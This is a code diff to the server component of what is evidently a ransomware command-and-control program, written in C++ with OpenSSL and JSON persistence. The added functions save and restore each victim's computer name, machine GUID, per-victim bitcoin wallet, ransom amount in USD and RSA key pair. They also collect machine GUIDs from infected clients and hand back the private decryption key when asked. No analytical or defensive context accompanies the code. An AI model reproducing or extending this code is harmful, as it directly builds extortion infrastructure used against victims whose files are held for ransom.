@@ -5,6 +5,8 @@
 #include <openssl/rsa.h>
 #include <openssl/pem.h>
 
+#include <fstream>
+
 RSAKeys ServerInterface::GenerateRSAPair() {
 	EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, nullptr);
 	if ( ctx == NULL )
@@ -88,6 +90,89 @@ BOOL ServerInterface::TCPSendMessageToAllClients(ServerCommand& req) {
 	return success;
 }
 
+JSON ServerInterface::ReadServerStateFile() {
+	std::cout << "reading server state file..\n";
+	JSON parsed;
+	if ( std::filesystem::file_size(STATE_SAVE_PATH + STATE_FILE_NAME) == 0 ) {
+		std::cout << "empty\n";
+		return parsed;
+	}
+	
+	std::ifstream input(STATE_SAVE_PATH + STATE_FILE_NAME);
+
+	input >> parsed;  // Attempt to parse the JSON
+	std::cout << "done\n";
+	return parsed;
+}
+
+Client* ServerInterface::GetClientSaveFile(long cuid) {
+	Client* client = GetClientPtr(cuid);
+	std::string machineGUID = client->MachineGUID;
+
+	if ( !IsClientInSaveFile(machineGUID) )
+		return {};
+
+	std::cout << "Importing client from save file\n";
+
+	JSON data = ReadServerStateFile();
+	if ( !data.contains("client_list") )
+		return nullptr;
+
+	JSON JSONClientList = data["client_list"];
+	JSON JSONClientInfo = JSONClientList[machineGUID];
+	client->ComputerName    = JSONClientInfo["computer_name"];
+	client->RansomAmountUSD = JSONClientInfo["ransom_payment_usd"];
+	client->MachineGUID     = JSONClientInfo["machine_guid"]; 
+
+	RSAKeys secrets;
+	macaron::Base64::Decode(JSONClientInfo["b64_rsa_public_key"], secrets.strPublicKey);
+	macaron::Base64::Decode(JSONClientInfo["b64_rsa_private_key"], secrets.strPrivateKey);
+	secrets.bioPrivateKey = client->GetSecrets().bioPrivateKey;
+	secrets.bioPublicKey = client->GetSecrets().bioPublicKey;
+	client->SetEncryptionKeys(secrets);
+	client->UniqueBTCWalletAddress = JSONClientInfo["unique_btc_wallet"];
+
+	std::cout << "Imported Client from save file (" << client->MachineGUID << "/" << client->ComputerName << ")\n";
+
+	return client;
+}
+
+BOOL ServerInterface::SaveServerState() {
+	ClientListMutex.lock();
+
+	std::cout << "Saving server state\n";
+
+	JSON data = ReadServerStateFile();
+	data["server_state"] = {
+		{"clients",  this->ClientList.size()},
+		{"udp_port", this->UDPServerDetails.port},
+		{"tcp_port", this->TCPServerDetails.port},
+		{"tcp_dns",  DNS_NAME},
+	};
+	
+	for ( auto& iter : this->ClientList ) {
+		Client client = iter.second;
+		data["client_list"][client.MachineGUID] = {
+			{ "computer_name", client.ComputerName },
+			{ "machine_guid", client.MachineGUID },
+			{ "client_id", client.ClientUID },
+			{ "unique_btc_wallet", client.UniqueBTCWalletAddress },
+			{ "ransom_payment_usd", client.RansomAmountUSD },
+			{ "b64_rsa_public_key", macaron::Base64::Encode(client.GetSecrets().strPublicKey) },
+			{ "b64_rsa_private_key", macaron::Base64::Encode(client.GetSecrets().strPrivateKey) },
+		};
+	}
+
+	std::cout << data.dump(4) << std::endl;
+
+	std::ofstream outFile(STATE_SAVE_PATH + STATE_FILE_NAME);
+	outFile << std::setw(4) << data << std::endl;
+	outFile.close();
+
+	ClientListMutex.unlock();
+	return TRUE;
+}
+
 void ServerInterface::ShutdownServer(BOOL confirm) {
 	if ( !confirm ) return;
 
@@ -145,6 +230,7 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 		//	success = FALSE;
 		//	break;
 		//}
+		std::cout << "Client wants this decryption key " << TCPClient->GetSecrets().strPrivateKey << std::endl;
 
 		ServerCommand reply(RemoteAction::RETURN_PRIVATE_RSA_KEY, {}, "", "", TCPClient->GetSecrets().strPrivateKey);
 		success = TCPSendMessageToClient(cuid, reply);
@@ -183,11 +269,22 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 		PerformRequest(receivedData, this->TCPServerDetails, cuid);
 	}
 
+	if ( client->ComputerName == "unknown" )
+		GetClientComputerName(cuid);
+	if ( client->MachineGUID == "unknown" )
+		GetClientMachineGUID(cuid);
+
+	if ( IsClientInSaveFile(client->MachineGUID) ) {
+		GetClientSaveFile(client->ClientUID);
+	}
+
+	std::cout << ";\n";
+
+	SaveServerState();
+
 	// tcp receive main loop
 	do
 	{
-		if ( client->ComputerName == "unknown" )
-			GetClientComputerName(cuid);
 
 		// get a client response usually after an action is performed on the remote host
 		if ( client->ExpectingResponse ) {
@@ -237,12 +334,13 @@ void ServerInterface::AcceptTCPConnections() {
 
 		std::cout << "Accepted a client on the tcp server." << std::endl;
 
+
 		Client  newClient(clientSocket, 0, addr);
 		RSAKeys keys = GenerateRSAPair();
 		newClient.SetEncryptionKeys(keys);
-
-		AddToClientList(newClient); // add them to the client list
 		
+		AddToClientList(newClient); // add them to the client list
+				
 		std::cout << "Good connection. Send TCP Client key\n";
 
 		// start receiving tcp data from that client for the lifetime of that client
@@ -251,6 +349,22 @@ void ServerInterface::AcceptTCPConnections() {
 
 		// TODO: make it so we can send information to the client
 	}
+}
+
+
+BOOL ServerInterface::GetClientMachineGUID(long cuid) {
+	Client* client = GetClientPtr(cuid);
+
+	BYTESTRING machienGUID;
+	BOOL received = NetCommon::ReceiveData(machienGUID, client->GetSocket(TCP), TCP);
+	if ( !received )
+		return FALSE;
+
+	BYTESTRING decrypted = NetCommon::RSADecryptStruct(machienGUID, client->GetSecrets().bioPrivateKey, TRUE);
+	std::string machineGuid = Serialization::BytestringToString(decrypted);
+	client->MachineGUID = machineGuid;
+	std::cout << "Got machine GUID: " << client->MachineGUID << std::endl;
+	return TRUE;
 }
 
 BOOL ServerInterface::GetClientComputerName(long cuid) {
@@ -264,7 +378,7 @@ BOOL ServerInterface::GetClientComputerName(long cuid) {
 	BYTESTRING decrypted = NetCommon::RSADecryptStruct(computerNameSerialized, client->GetSecrets().bioPrivateKey, TRUE);
 	std::string computerName = Serialization::BytestringToString(decrypted);
 	client->ComputerName = computerName.c_str();
-	std::cout << "Got client computer naem: " << client->ComputerName << " / " << computerName << std::endl;
+	std::cout << "Got client computer naem: " << client->ComputerName << std::endl;
 
 	return TRUE;
 }
